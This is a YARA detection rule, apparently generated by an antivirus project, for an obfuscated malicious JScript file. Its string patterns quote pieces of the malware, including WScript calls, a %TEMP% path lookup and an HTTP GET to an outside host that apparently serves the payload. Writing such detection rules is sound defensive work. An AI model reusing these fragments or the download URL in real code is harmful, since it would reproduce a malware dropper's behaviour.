rule sig_20160428_d4a07f3e2affd5010e951018fb8071b6 {
  meta:
    description = "datamaliciousorder - file 20160428_d4a07f3e2affd5010e951018fb8071b6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5ac8be592f12de2bc5649f7a53be574002b71ce3573df56c806288a3d7742a18"

  strings:
    $s1  = "function LogStwNgcTbfNkfOhfBvh(HulFjnIrdGdeUomLlvWij){PuoQbuKffYzvOgmAazPnx[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function LogStwNgcTbfNkfOhfBvh(HulFjnIrdGdeUomLlvWij){PuoQbuKffYzvOgmAazPnx[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function RxuXdxIxxIucZmqNuiIff(SliCqiRcjWqrVpbCzbHks, AwmYniHjmOakNyeOdlExx){TkyWkaZopQgkChvFqpNde = TkyWkaZopQgkChvFqpNde * 1; " ascii
    $s4  = "return SliCqiRcjWqrVpbCzbHks - AwmYniHjmOakNyeOdlExx;};" fullword ascii
    $s5  = "function MvkCgsQmlCgeHigAiaTdu() {return PuoQbuKffYzvOgmAazPnx[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s6  = "function RxuXdxIxxIucZmqNuiIff(SliCqiRcjWqrVpbCzbHks, AwmYniHjmOakNyeOdlExx){TkyWkaZopQgkChvFqpNde = TkyWkaZopQgkChvFqpNde * 1; " ascii
    $s7  = "var PuoQbuKffYzvOgmAazPnx = function AsgPkrYacLhjOljBkeIgw() {return ZddYobNmuVnhIhtTejQwk[GghSknYzdGhzVpeHcdTdi](\"WScript\"+\"" ascii
    $s8  = "BjxXyfRhxGyiBblQwyDkk[EjpEcwEjlCxxSoyIobTfv](\"G\" + \"ET\", \"http://minisupergame.ru/a9osfg\", false);" fullword ascii
    $s9  = "var ZddYobNmuVnhIhtTejQwk = this[\"WScript\"];" fullword ascii
    $s10 = "var PuoQbuKffYzvOgmAazPnx = function AsgPkrYacLhjOljBkeIgw() {return ZddYobNmuVnhIhtTejQwk[GghSknYzdGhzVpeHcdTdi](\"WScript\"+\"" ascii
    $s11 = "function MvkCgsQmlCgeHigAiaTdu() {return PuoQbuKffYzvOgmAazPnx[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s12 = "if (BjxXyfRhxGyiBblQwyDkk[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function QbzBqvAryTykGduWhoWhe(){return JbkTbhQpsZiqQghGqoIiy + \"\";};" fullword ascii
    $s14 = "function WfnEjxBlzJfvBcpLkkYql() {return ((EphYjgPpdPkyWgsCguAly == true) && (EphYjgPpdPkyWgsCguAly == BvvPncLecVosMruJuzOjj)) ?" ascii
    $s15 = "function WfnEjxBlzJfvBcpLkkYql() {return ((EphYjgPpdPkyWgsCguAly == true) && (EphYjgPpdPkyWgsCguAly == BvvPncLecVosMruJuzOjj)) ?" ascii
    $s16 = "function QarIxtTrdDybLvjJudEaj(){return 23;};" fullword ascii
    $s17 = "BstRwuTclLevQwyGmpQcm = true;" fullword ascii
    $s18 = "var BvvPncLecVosMruJuzOjj = false;" fullword ascii
    $s19 = "BvvPncLecVosMruJuzOjj = true; " fullword ascii
    $s20 = "var EphYjgPpdPkyWgsCguAly = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}